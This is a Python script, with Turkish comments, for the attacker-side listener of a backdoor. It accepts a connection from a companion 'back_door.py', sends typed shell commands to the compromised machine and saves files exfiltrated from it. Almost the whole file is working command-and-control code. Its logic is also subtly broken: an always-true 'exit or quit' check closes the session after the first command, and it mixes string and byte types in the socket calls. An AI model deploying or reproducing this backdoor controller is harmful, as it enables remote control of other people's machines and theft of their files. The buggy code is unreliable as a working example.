import socket
import json
import base64

class SocketListener:
    def __init__(self, ip, port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
                               1)  # burası bu instance'ın birden fazla bağlantıda çalışmasını sağlar

        my_listener.bind(
            (ip, port))  # hangi ip'de ve portta dinleyeeceğiz. parametreler içeri tuple olarak gönderilir
        my_listener.listen(
            0)  # dinlemeyi başlatıyoruz, içeri back_log adında parametre verilir -> kaç bağlantıdan sonra bağlantıyı almayı kapat diyorsun
        print("Listening!")
        (self.my_connection,
         my_address) = my_listener.accept()  # bundan sonra bir bağlantı gelirse kabul ettiriyoruz. my_address -> back_door.py ile bağlantının geldiği yer, my_connection -> kurulan bağlantı
        print("Connection OK! from {}".format(str(my_address)))

    def json_send(self,data):
        json_data = json.dumps(data)
        self.my_connection.send(json_data)
    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    def command_execution(self,command_input):
        self.json_send(command_input)
        if command_input[0] == "exit" or "quit":
            self.my_connection.close()
            exit()
        #self.my_connection.send(command_input)
        #return self.my_connection.recv(1024)  # bağlantıdan veri almamızı sağlar
        return self.json_receive()
    def save_file(self,path,content):
        with open(path,"wb") as file: # wb -> write binary
            file.write(base64.b64decode(content)) # indirirken dosyayı decrypt ediyoruz
            return "Download OK!"
    def start_listener(self):
        while True:
            command_input = input("Enter command:")
            command_input = command_input.split(" ") # aradaki boşluklara göre stringi parçalar
            command_output = self.command_execution(command_input)
            if command_input[0] == "download":
                command_output = self.save_file(command_input[1],command_output)
            print(command_output)



listener = SocketListener("192.168.56.1", 8080)
listener.start_listener()